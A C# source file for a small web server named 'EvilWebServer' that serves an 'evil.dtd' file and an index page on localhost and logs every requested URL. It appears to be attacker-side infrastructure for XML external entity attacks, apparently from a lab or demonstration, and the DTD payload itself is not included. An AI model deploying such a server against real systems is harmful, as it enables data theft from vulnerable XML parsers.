using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;

namespace EvilWebServer
{
    class Program
    {
        static HttpListener _Listener;
        static AutoResetEvent _ListenForNext = new AutoResetEvent(false);
        const string _Prefix = "http://localhost:5050/";

        static void Main(string[] args)
        {
            Start();
            Console.WriteLine("Press any key to stop the server...");
            Console.ReadKey();
            Stop();
        }

        static void Start()
        {
            _Listener = new HttpListener();
            _Listener.Prefixes.Clear();
            _Listener.Prefixes.Add(_Prefix);
            _Listener.Start();
            ThreadPool.QueueUserWorkItem(Listen);
        }

        static void Stop()
        {
            _Listener.Stop();
        }

        static void Listen(object state)
        {
            while (_Listener.IsListening)
            {
                var context = _Listener.GetContext();
                var request = context.Request;
                var response = context.Response;
                var fileRequested = Path.GetFileName(request.Url.ToString());
                if (fileRequested.StartsWith("evil.dtd"))
                {
                    var data = File.ReadAllBytes("evil.dtd");
                    response.ContentType = "application/xml-dtd";
                    response.ContentEncoding = Encoding.UTF8;
                    response.ContentLength64 = data.LongLength;
                    response.OutputStream.Write(data);
                }

                if (fileRequested.StartsWith("index.html"))
                {
                    var data = File.ReadAllBytes("index.html");
                    response.ContentType = "text/html";
                    response.ContentEncoding = Encoding.UTF8;
                    response.ContentLength64 = data.LongLength;
                    response.OutputStream.Write(data);
                }

                Console.WriteLine(request.Url);
            }
        }
    }
}
